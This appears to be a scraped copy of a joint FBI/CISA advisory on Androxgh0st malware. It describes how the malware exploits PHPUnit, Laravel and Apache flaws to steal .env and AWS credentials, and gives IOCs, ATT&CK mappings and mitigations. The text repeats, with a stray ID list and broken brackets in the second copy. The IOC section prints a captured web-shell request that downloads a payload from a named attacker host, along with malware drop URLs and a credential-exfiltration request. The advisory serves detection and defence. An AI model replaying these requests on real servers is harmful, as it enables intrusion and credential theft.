Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit [T1190]. Websites using the PHPUnit module that have internet-accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code.
Malicious actors likely use Androxgh0st to download malicious files [T1105] to the system hosting the website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to provide backdoor access to the website. This allows threat actors to download additional malicious files for their operations and access databases.
Laravel Framework Targeting
Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework. After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level .env file is exposed and contains credentials for accessing additional services. Note: .env files commonly store credentials and tokens. Threat actors often target .env files to steal these credentials within the environment variables.
If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x[] containing certain data sent to the web server. This data is frequently used as an identifier for the threat actor. This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet). A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts.
Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the website. If the threat actors successfully identify the Laravel application key, they will attempt exploitation by using the key to encrypt PHP code [T1027.010]. The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and included in a future GET request to the website. The vulnerability defined in CVE-2018-15133 indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which can allow for remote code execution. In doing so, the threat actors can upload files to the website via remote access.
Apache Web Server Targeting
In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable web servers [T1595.002] running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can identify uniform resource locators (URLs) for files outside root directory through a path traversal attack [T1083]. If these files are not protected by the “request all denied” configuration and Common Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.
If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies [T1136]. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for conducting additional scanning activity [T1583.006].
INDICATORS OF COMPROMISE (IOCs)
Based on investigations and analysis, the following requests are associated with Androxgh0st activity:

Incoming GET and POST requests to the following URIs:

/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/.env


Incoming POST requests with the following strings:

[0x%5B%5D=androxgh0st]
ImmutableMultiDict([('0x[]', 'androxgh0st')])



In both previously listed POST request strings, the name androxgh0st has been observed to be replaced with other monikers.
Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include:

/info
/phpinfo
/phpinfo.php
/?phpinfo=1
/frontend_dev.php/$
/_profiler/phpinfo
/debug/default/view?panel=config
/config.json
/.json
/.git/config
/live_env
/.env.dist
/.env.save
/environments/.env.production
/.env.production.local
/.env.project
/.env.development
/.env.production
/.env.prod
/.env.development.local
/.env.old
/<insert-directory>/.env 

Note: the actor may attempt multiple different potential URI endpoints scanning for the .env file, for example /docker/.env or /local/.env.


/.aws/credentials
/aws/credentials
/.aws/config
/.git
/.test
/admin
/backend
/app
/current
/demo
/api
/backup
/beta
/cron
/develop
/Laravel
/laravel/core
/gists/cache
/test.php
/info.php
//.env
/admin-app/.env%20
/laravel/.env%20
/shared/.env%20
/.env.project%20
/apps/.env%20
/development/.env%20
/live_env%20
/.env.development%20

Targeted URIs for web-shell drop:

/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/Util/PHP/eval-stdin.php
//lib/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/Util/PHP/eval-stdin.php
//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/Util/PHP/eval-stdin.php
//phpunit/src/Util/PHP/eval-stdin.php
//phpunit/Util/PHP/eval-stdin.php
//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstdin.php
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
//vendor/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/Util/PHP/eval-stdin.php
//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval
stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/evalstdin.php
/phpunit/src/Util/PHP/eval-stdin.php
./phpunit/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php%20
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

An example of attempted credential exfiltration through (honeypot) open proxies:
POST /.aws/credentials HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept-encoding: gzip, deflateaccept: */*connection: keep-alivecontent-length: 20content-type: application/x-www-form-urlencoded0x%5B%5D=androxgh0st
An example of attempted web-shell drop through (honeypot) open proxies:
GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76accept-encoding: gzip, deflateaccept: */*connection: keep-alivex-forwarded-for: 200.172.238.135content-length: 279<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?>
Monikers used instead of Androxgh0st (0x%5B%5D=???):

Ridho
Aws
0x_0x
x_X
nopebee7
SMTPEX
evileyes0
privangga
drcrypter
errorcool
drosteam
androxmen
crack3rz
b4bbyghost
0x0day
janc0xsec
blackb0x
0x1331day
Graber

Example malware drops through eval-stdin.php:
hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4hxxps://chainventures.co[.]uk/.well-known/aasdcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6hxxp://download.asyncfox[.]xyz/download/xmrig.x86_6423fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066hxxps://pastebin[.]com/raw/zw0gAmpCca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317efhxxp://45.95.147[.]236/tmp.x86_646b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbchxxp://main.dsn[.]ovh/dns/pwerbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7hxxp://tangible-drink.surge[.]sh/configx.txtde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.

Table 1: Reconnaissance


Technique Title
ID
Use




Active Scanning: Vulnerability Scanning
T1595.002
The threat actor scans websites for specific vulnerabilities to exploit.




Table 2: Resource Development


Technique Title
ID
Use




Acquire Infrastructure: Botnet
T1583.005
The threat actor establishes a botnet to identify and exploit victims.


Acquire Infrastructure: Web Services
T1583.006
The threat actor creates new AWS instances to use for scanning.




Table 3: Initial Access


Technique Title
ID
Use




Exploit Public-Facing Application
T1190
The threat actor exploits CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on websites via PHPUnit.




Table 4: Execution


Technique Title
ID
Use




Command and Scripting Interpreter: Python
T1059.006
The threat actor uses Androxgh0st, a Python-scripted malware, to target victim files.




Table 5: Persistence


Technique Title
ID
Use




Valid Accounts
T1078
The threat actor abuses the simple mail transfer protocol (SMTP) by exploiting exposed credentials.


Server Software Component: Web Shell
T1505.003
The threat actor deploys web shells to maintain persistent access to systems.


Create Account
T1136
The threat actor attempts to create new users and user policies with compromised AWS credentials from a vulnerable website.




Table 6: Defense Evasion


Technique Title
ID
Use




Obfuscated Files or Information: Command Obfuscation
T1027.010
The threat actor can exploit a successfully identified Laravel application key to encrypt PHP code, which is then passed to the site as a value in the XSRF-TOKEN cookie.




Table 7: Credential Access


Technique Title
ID
Use




Credential Access
TA0006
The threat actor can access the application key of the Laravel application on the site.


Unsecured Credentials: Credentials in Files
T1552.001
The threat actor targets .env files that contain confidential credential information.




Table 8: Discovery


Technique Title
ID
Use




File and Directory Discovery
T1083
The threat actor can identify URLs for files outside root directory through a path traversal attack.


Network Service Discovery
T1046
The threat actor uses Androxgh0st to abuse simple mail transfer protocol (SMTP) via scanning.




Table 9: Collection


Technique Title
ID
Use




Email Collection
T1114
The threat actor interacts with application programming interfaces (APIs) to gather information.




Table 10: Command and Control


Technique Title
ID
Use




Ingress Tool Transfer
T1105
The threat actor runs PHP code through a POST request to download malicious files to the system hosting the website.



MITIGATIONS
The FBI and CISA recommend implementing the mitigations below to improve your organization’s cybersecurity posture based on Androxgh0st threat actor activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.
These mitigations apply to all critical infrastructure organizations and network defenders. FBI and CISA recommend that software manufacturers incorporate secure by design principles and tactics into their software development practices, limiting the impact of actor techniques and strengthening their customers’ security posture. For more information on secure by design, see CISA’s Secure by Design webpage.
The FBI and CISA recommend network defenders apply the following mitigations to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by actors using Androxgh0st malware.

Keep all operating systems, software, and firmware up to date. Specifically, ensure that Apache servers are not running versions 2.4.49 or 2.4.50. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.
Verify that the default configuration for all URIs is to deny all requests unless there is a specific need for it to be accessible.
Ensure that any live Laravel applications are not in “debug” or testing mode. Remove all cloud credentials from .env files and revoke them. All cloud providers have safer ways to provide temporary, frequently rotated credentials to code running inside a web server without storing them in any file.
On a one-time basis for previously stored cloud credentials, and on an on-going basis for other types of credentials that cannot be removed, review any platforms or services that have credentials listed in the .env file for unauthorized access or use.
Scan the server’s file system for unrecognized PHP files, particularly in the root directory or /vendor/phpunit/phpunit/src/Util/PHP folder.
Review outgoing GET requests (via cURL command) to file hosting sites such as GitHub, pastebin, etc., particularly when the request accesses a .php file.

VALIDATE SECURITY CONTROLS
In addition to applying mitigations, FBI and CISA recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. The authoring agencies recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Tables 1-10).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

FBI and CISA recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
REPORTING
The FBI encourages organizations to report information concerning suspicious or criminal activity to their local FBI field office. With regards to specific information that appears in this CSA, indicators should always be evaluated in light of an organization’s complete security situation.
When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Reports can be submitted to the FBI Internet Crime Complaint Center (IC3), a local FBI Field Office, or to CISA via its Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
RESOURCES

CISA: Known Exploited Vulnerabilities Catalog
CISA, MITRE: Best Practices for MITRE ATT&CK Mapping
CISA: Decider Tool
NIST: CVE-2017-9841
NIST: CVE-2018-15133
NIST: CVE-2021-41773
CISA: Cross-Sector Cybersecurity Performance Goals
CISA: Secure by Design

REFERENCES

Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild

ACKNOWLEDGEMENTS
Amazon contributed to this CSA.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. FBI and CISA do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI and CISA.
VERSION HISTORY
January 16, 2024: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0006', 'T1595.002', 'T1190', 'T1083', 'T1583.006', 'T1114', 'T1552.001', 'T1027.010', 'T1105', 'T1046', 'T1595', 'T1505.003', 'T1136', 'T1583.005', 'T1059.006', 'T1078'}","






Actions to take today to mitigate malicious cyber activity:




Prioritize patching known exploited vulnerabilities in internet-facing systems.
Review and ensure only necessary servers and services are exposed to the internet.
Review platforms or services that have credentials listed in .env files for unauthorized access or use.







SUMMARY
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory (CSA) to disseminate known indicators of compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with threat actors deploying Androxgh0st malware. Multiple, ongoing investigations and trusted third party reporting yielded the IOCs and TTPs, and provided information on Androxgh0st malware’s ability to establish a botnet that can further identify and compromise vulnerable networks.
The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.
Download the PDF version of this report:


AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware
(PDF,       576.40 KB
  )




AA24-016A Known Indicators of Compromise Associated with Androxgh0st Malware - Spanish
(PDF,       353.45 KB
  )


For a downloadable copy of IOCs, see:


AA24-016A STIX XML
(XML,       45.81 KB
  )




AA24-016A STIX JSON
(JSON,       39.87 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques with corresponding mitigation and/or detection recommendations. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
Overview
Androxgh0st malware has been observed establishing a botnet, for victim identification and exploitation in target networks. According to open source reporting,1, Androxgh0st is a Python-scripted malware, primarily used to target .env files that contain confidential information, such as credentials, for various high profile applications (i.e., Amazon Web Services,AWS, Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning, and exploiting exposed credentials, and application programming interfaces (APIs), and web shell deployment,.
Targeting the PHPUnit
Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning, and searching for websites with specific vulnerabilities. In particular, threat actors deploying Androxgh0st have been observed exploiting CVE-2017-9841 to remotely run hypertext preprocessor (PHP) code on fallible websites via PHPUnit,. Websites using the PHPUnit module that have internet-accessible (exposed) /vendor folders are subject to malicious HTTP POST requests to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php uniform resource identifier (URI). This PHP page runs PHP code submitted through a POST request, which allows the threat actors to remotely execute code.
Malicious actors likely use Androxgh0st to download malicious files, to the system hosting the website. Threat actors are further able to set up a fake (illegitimate) page accessible via the URI to provide backdoor access to the website. This allows threat actors to download additional malicious files for their operations and access databases.
Laravel Framework Targeting
Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework. After identifying websites using the Laravel web application, threat actors attempt to determine if the domain’s root-level .env file is exposed and contains credentials for accessing additional services. Note: .env files commonly store credentials and tokens. Threat actors often target .env files to steal these credentials within the environment variables.
If the .env file is exposed, threat actors will issue a GET request to the /.env URI to attempt to access the data on the page. Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x, containing certain data sent to the web server. This data is frequently used as an identifier for the threat actor. This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet). A successful response from either of these methods allows the threat actors to look for usernames, passwords, and/or other credentials pertaining to services such as email (via SMTP) and AWS accounts.
Androxgh0st malware can also access the application key, for the Laravel application on the website. If the threat actors successfully identify the Laravel application key, they will attempt exploitation by using the key to encrypt PHP code,. The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and included in a future GET request to the website. The vulnerability defined in CVE-2018-15133 indicates that on Laravel applications, XSRF token values are subject to an un-serialized call, which can allow for remote code execution. In doing so, the threat actors can upload files to the website via remote access.
Apache Web Server Targeting
In correlation with CVE-2021-41773, Androxgh0st actors have been observed scanning vulnerable web servers, running Apache HTTP Server versions 2.4.49 or 2.4.50. Threat actors can identify uniform resource locators (URLs) for files outside root directory through a path traversal attack,. If these files are not protected by the “request all denied” configuration and Common Gateway Interface (CGI) scripts are enabled, this may allow for remote code execution.
If threat actors obtain credentials for any services using the above methods, they may use these credentials to access sensitive data or use these services to conduct additional malicious operations. For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies,. Additionally, Andoxgh0st actors have been observed creating new AWS instances to use for conducting additional scanning activity,.
INDICATORS OF COMPROMISE (IOCs)
Based on investigations and analysis, the following requests are associated with Androxgh0st activity:

Incoming GET and POST requests to the following URIs:

/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/.env


Incoming POST requests with the following strings:,0x%5B%5D=androxgh0st,
ImmutableMultiDict(,('0x,', 'androxgh0st'),)



In both previously listed POST request strings, the name androxgh0st has been observed to be replaced with other monikers.
Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include:

/info
/phpinfo
/phpinfo.php
/?phpinfo=1
/frontend_dev.php/$
/_profiler/phpinfo
/debug/default/view?panel=config
/config.json
/.json
/.git/config
/live_env
/.env.dist
/.env.save
/environments/.env.production
/.env.production.local
/.env.project
/.env.development
/.env.production
/.env.prod
/.env.development.local
/.env.old
/<insert-directory>/.env 

Note: the actor may attempt multiple different potential URI endpoints scanning for the .env file, for example /docker/.env or /local/.env.


/.aws/credentials
/aws/credentials
/.aws/config
/.git
/.test
/admin
/backend
/app
/current
/demo
/api
/backup
/beta
/cron
/develop
/Laravel
/laravel/core
/gists/cache
/test.php
/info.php
//.env
/admin-app/.env%20
/laravel/.env%20
/shared/.env%20
/.env.project%20
/apps/.env%20
/development/.env%20
/live_env%20
/.env.development%20

Targeted URIs for web-shell drop:

/.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/phpunit/Util/PHP/eval-stdin.php
//lib/phpunit/src/Util/PHP/eval-stdin.php
//lib/phpunit/Util/PHP/eval-stdin.php
//new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/src/Util/PHP/eval-stdin.php
//phpunit/phpunit/Util/PHP/eval-stdin.php
//phpunit/src/Util/PHP/eval-stdin.php
//phpunit/Util/PHP/eval-stdin.php
//protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstdin.php
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
//vendor/phpunit/src/Util/PHP/eval-stdin.php
//vendor/phpunit/Util/PHP/eval-stdin.php
//wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
//www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php
/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php
/lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval-stdin.php
/lib/phpunit/phpunit/Util/PHP/eval
stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/src/Util/PHP/eval-stdin.php
/lib/phpunit/Util/PHP/eval-stdin.php
/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php
/phpunit/phpunit/Util/PHP/eval-stdin.php%20/phpunit/src/Util/PHP/evalstdin.php
/phpunit/src/Util/PHP/eval-stdin.php
./phpunit/Util/PHP/eval-stdin.php
/phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/src/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php
/vendor/phpunit/Util/PHP/eval-stdin.php%20
/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php

An example of attempted credential exfiltration through (honeypot) open proxies:
POST /.aws/credentials HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept-encoding: gzip, deflateaccept: */*connection: keep-alivecontent-length: 20content-type: application/x-www-form-urlencoded0x%5B%5D=androxgh0st
An example of attempted web-shell drop through (honeypot) open proxies:
GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1host: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76accept-encoding: gzip, deflateaccept: */*connection: keep-alivex-forwarded-for: 200.172.238.135content-length: 279<?php file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt')); system('wget hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt -O evil.php;curl hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt -O evil.php'); ?>
Monikers used instead of Androxgh0st (0x%5B%5D=???):

Ridho
Aws
0x_0x
x_X
nopebee7
SMTPEX
evileyes0
privangga
drcrypter
errorcool
drosteam
androxmen
crack3rz
b4bbyghost
0x0day
janc0xsec
blackb0x
0x1331day
Graber

Example malware drops through eval-stdin.php:
hxxps://mc.rockylinux,.,si/seoforce/triggers/files/evil.txt59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4hxxps://chainventures.co,.,uk/.well-known/aasdcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6hxxp://download.asyncfox,.,xyz/download/xmrig.x86_6423fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066hxxps://pastebin,.,com/raw/zw0gAmpCca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72hxxp://raw.githubusercontent,.,com/0x5a455553/MARIJUANA/master/MARIJUANA.php0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317efhxxp://45.95.147,.,236/tmp.x86_646b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbchxxp://main.dsn,.,ovh/dns/pwerbb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7hxxp://tangible-drink.surge,.,sh/configx.txtde1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba
MITRE ATT&CK TACTICS AND TECHNIQUES
See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory.










MITIGATIONS
